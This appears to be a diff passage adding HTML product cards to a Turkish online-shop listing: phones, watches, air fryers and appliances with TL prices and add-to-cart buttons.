+         </span>
+         <h3 class="item-name" content="30429427">
+          Apple Watch Series 7 45mm GPS Yıldız Işığı Akıllı Saat (Apple Türkiye Garantili)
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          10.099,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle35" onclick="SepeteEkle(35)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor35" onclick="SepeteEkle(35)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim35" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=36">
+         <span class="thumb">
+          <img alt="Xiaomi Redmi Note 13 8 GB RAM 256 GB Siyah (Xiaomi Türkiye Garantili)" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/543/375-375/110000603451953.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/543/375-375/110000603451953.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Xiaomi Redmi Note 13 8 GB RAM 256 GB Siyah (Xiaomi Türkiye Garantili)
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          10.549,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle36" onclick="SepeteEkle(36)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor36" onclick="SepeteEkle(36)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim36" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=37">
+         <span class="thumb">
+          <img alt="Samsung Galaxy A23 128 GB 6 GB RAM Siyah Cep Telefonu (Samsung Türkiye Garantili)" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/295/375-375/110000285331471.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/295/375-375/110000285331471.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Samsung Galaxy A23 128 GB 6 GB RAM Siyah Cep Telefonu (Samsung Türkiye Garantili)
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          14.172,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle37" onclick="SepeteEkle(37)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor37" onclick="SepeteEkle(37)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim37" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=38">
+         <span class="thumb">
+          <img alt="DYSON Corrale™ Saç Düzleştirici (Blue Blush)" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/503/424-600/110000557279312.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/503/424-600/110000557279312.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          DYSON Corrale™ Saç Düzleştirici (Blue Blush)
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          16.599,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle38" onclick="SepeteEkle(38)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor38" onclick="SepeteEkle(38)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim38" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=39">
+         <span class="thumb">
+          <img alt="Xiaomi Mi Smart Air Fryer 3.5 L Yağsız Fritöz" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/554/375-375/110000616035481.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/554/375-375/110000616035481.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Xiaomi Mi Smart Air Fryer 3.5 L Yağsız Fritöz
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          2.399,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle39" onclick="SepeteEkle(39)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor39" onclick="SepeteEkle(39)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim39" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=40">
+         <span class="thumb">
+          <img alt="Volta Vb1 Elektrikli Katlanır Bisiklet" data-loadedx="false" data-src="https://cdn.dsmcdn.com/mnresize/500/-/ty1414/product/media/images/prod/QC/20240711/12/5027aea0-fd66-3b55-bc42-d39724f414fa/1_org.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://cdn.dsmcdn.com/mnresize/500/-/ty1414/product/media/images/prod/QC/20240711/12/5027aea0-fd66-3b55-bc42-d39724f414fa/1_org.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Volta Vb1 Elektrikli Katlanır Bisiklet
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          25.099,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle40" onclick="SepeteEkle(40)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor40" onclick="SepeteEkle(40)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim40" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=41">
+         <span class="thumb">
+          <img alt="Huawei Watch Fit 2 - Siyah" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/464/375-375/110000501464474.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/464/375-375/110000501464474.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Huawei Watch Fit 2 - Siyah
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          2.849,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle41" onclick="SepeteEkle(41)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor41" onclick="SepeteEkle(41)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim41" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=42">
+         <span class="thumb">
+          <img alt="Apple Watch Series 8 41mm GPS Gece Yarısı Alüminyum Kasa ve Spor Kordon-Regular (Apple Türkiye Garantili)" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/337/375-375/110000311845556.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/337/375-375/110000311845556.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Apple Watch Series 8 41mm GPS Gece Yarısı Alüminyum Kasa ve Spor Kordon-Regular (Apple Türkiye Garantili)
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          12.499,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle42" onclick="SepeteEkle(42)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor42" onclick="SepeteEkle(42)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim42" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=43">
+         <span class="thumb">
+          <img alt="POCO Xiaomi C40 4/64 Gb Siyah Cep Telefonu" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/239/375-375/110000223315227.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/239/375-375/110000223315227.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          POCO Xiaomi C40 4/64 Gb Siyah Cep Telefonu
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          7.799,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle43" onclick="SepeteEkle(43)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor43" onclick="SepeteEkle(43)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim43" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=44">
+         <span class="thumb">
+          <img alt="Samsung Galaxy S21 Fe 5g 128gb Grafit" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/777/375-375/110000732225193.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/777/375-375/110000732225193.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Samsung Galaxy S21 Fe 5g 128gb Grafit
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          18.031,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle44" onclick="SepeteEkle(44)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor44" onclick="SepeteEkle(44)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim44" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=45">
+         <span class="thumb">
+          <img alt="Xiaomi Buds 3t Pro White" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/226/375/110000206509395.jpg/format:webp" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/226/375/110000206509395.jpg/format:webp" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Xiaomi Buds 3t Pro White
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          1.324,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle45" onclick="SepeteEkle(45)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor45" onclick="SepeteEkle(45)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim45" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=46">
+         <span class="thumb">
+          <img alt="HOMEND Airfrday 2503h 8 Farklı Program Dokunmatik Ekran 4,2 Litre Smart Airfryer (Wİ-Fİ İLE KONTROL)" data-loadedx="false" data-src="https://cdn.dsmcdn.com/mnresize/400/-/ty864/product/media/images/20230504/19/339826986/927509474/1/1_org_zoom.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://cdn.dsmcdn.com/mnresize/400/-/ty864/product/media/images/20230504/19/339826986/927509474/1/1_org_zoom.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          HOMEND Airfrday 2503h 8 Farklı Program Dokunmatik Ekran 4,2 Litre Smart Airfryer (Wİ-Fİ İLE KONTROL)
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          2.939,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle46" onclick="SepeteEkle(46)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor46" onclick="SepeteEkle(46)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim46" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=48">
+         <span class="thumb">
+          <img alt="Seg BM6001 6 Programlı Bulaşık Makinesi" data-loadedx="false" data-src="https://cdn.dsmcdn.com/mnresize/1200/1800/ty1017/product/media/images/prod/SPM/PIM/20231019/11/e3d5b5e9-9810-3ba1-bf9d-000f0803384a/1_org_zoom.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://cdn.dsmcdn.com/mnresize/1200/1800/ty1017/product/media/images/prod/SPM/PIM/20231019/11/e3d5b5e9-9810-3ba1-bf9d-000f0803384a/1_org_zoom.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Seg BM6001 6 Programlı Bulaşık Makinesi
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          11.499,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle48" onclick="SepeteEkle(48)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor48" onclick="SepeteEkle(48)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim48" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=49">
+         <span class="thumb">
+          <img alt="Apple iPhone 16 Pro Max 512GB Natürel Titanyum" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/777/375-375/110000767800452.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/777/375-375/110000767800452.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Apple iPhone 16 Pro Max 512GB Natürel Titanyum
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          120.999,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle49" onclick="SepeteEkle(49)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor49" onclick="SepeteEkle(49)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim49" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=50">
+         <span class="thumb">
+          <img alt="Xiaomi Redmi 12 128 GB 8 GB RAM Gümüş Cep Telefonu (Xiaomi Türkiye Garantili)" data-loadedx="false" data-src="https://www.cihazpark.com.tr/img/products/redmi12-128-8-silver_td_5.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://www.cihazpark.com.tr/img/products/redmi12-128-8-silver_td_5.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Xiaomi Redmi 12 128 GB 8 GB RAM Gümüş Cep Telefonu (Xiaomi Türkiye Garantili)
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          8.854,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
